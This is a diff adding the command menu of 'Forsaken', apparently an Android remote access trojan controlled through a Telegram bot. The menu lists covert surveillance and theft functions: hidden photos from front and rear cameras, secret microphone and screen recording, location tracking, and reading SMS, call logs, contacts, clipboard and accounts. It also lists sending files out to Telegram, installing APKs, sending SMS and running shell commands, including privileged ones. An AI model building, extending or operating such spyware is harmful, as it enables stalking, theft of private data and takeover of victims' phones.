@@ -1,0 +1,64 @@
+╭───『 Forsaken Operations Menu 』───╮
+
+  ⚙️ SYSTEM AND CONTROL COMMANDS
+  ➤ /help [command] - Detailed command list or specific command help
+  ➤ /settings list - Lists modifiable settings
+  ➤ /settings <setting> <value> - Changes system settings (flash, rotation, airplane etc.)
+  ➤ /volume <type> <percent> - Adjusts volume levels (media, ring, alarm, call)
+  ➤ /sysinfo - Detailed device system, battery, and hardware report
+  ➤ /vibrate [ms] - Vibrates the device for the specified duration
+  ➤ /sensor [type|list] - Reads device sensor data
+  ➤ /reset_all - Resets all configurations and temporary data
+
+  📁 FILE AND STORAGE
+  ➤ /file <directory> - Lists files in the specified folder
+  ➤ /data - Lists the panel working directory (TARGET_DIR)
+  ➤ /download <path> - Sends a file from the device to Telegram
+  ➤ /upload - Saves a file/photo to the device by sending it to the bot
+  ➤ /filexp [command] - Advanced file manager infrastructure
+  ➤ /find <name> - Searches for files and directories on the device
+  ➤ /zip <path> - Converts a folder into a zip archive
+
+  🚀 APPLICATIONS AND PROCESSES
+  ➤ /apps - Lists installed applications
+  ➤ /open_app <package> - Launches a specific application
+  ➤ /kill <package> - Terminates a running application
+  ➤ /apk <path> - Installs the specified APK file
+  ➤ /open_site <url> - Opens a website in the browser
+  ➤ /send_intent <action> [data] [pkg] - Sends a custom Intent
+
+  📍 MEDIA AND AUTOMATION
+  ➤ /locate - Gets instant GPS/Network location and map link
+  ➤ /screenshot - Captures a screenshot
+  ➤ /cam_front - Takes a hidden photo from the front camera
+  ➤ /cam_back - Takes a hidden photo from the rear camera
+  ➤ /microphone [seconds] - Records ambient audio and sends it
+  ➤ /screenrecord [seconds|stop] - Starts or stops screen video recording
+  ➤ /grapy <see|touch|scroll> - Accessibility screen analysis, touch, and scroll automation
+  ➤ /wallpaper [path] - Changes the device wallpaper
+  ➤ /play <file_path> - Plays an audio file on the device
+  ➤ /stop_audio - Stops the playing audio media
+  ➤ /tts <text> - Converts text to speech on the device and reads it
+
+  💬 COMMUNICATION AND DATA
+  ➤ /sms_list - Lists recently received SMS
+  ➤ /sms_send <phone> <msg> - Sends an SMS to the specified number
+  ➤ /calls - Lists call history
+  ➤ /phone - Lists contacts in the phonebook
+  ➤ /callnum <no> - Calls the specified number
+  ➤ /getclip - Reads text from the device clipboard
+  ➤ /setclip <text> - Writes text to the device clipboard
+  ➤ /accounts - Lists registered accounts on the device
+  ➤ /permission - Reports critical permission statuses
+  ➤ /media_log - Lists media playback logs
+
+  🌐 CONNECTION AND NETWORK
+  ➤ /connections <action> [sub] [param] - Connection and network tools
+  ➤ /http <get|post|ping> <target> - Sends HTTP / network requests
+
+  💻 SHELL AND PRIVILEGE
+  ➤ /shell <command> - Executes a standard shell (sh) command
+  ➤ /shizuku <command> - Executes a command with Shizuku privileges
+
+╰──────────────────────╯
+@JavaKyoseva
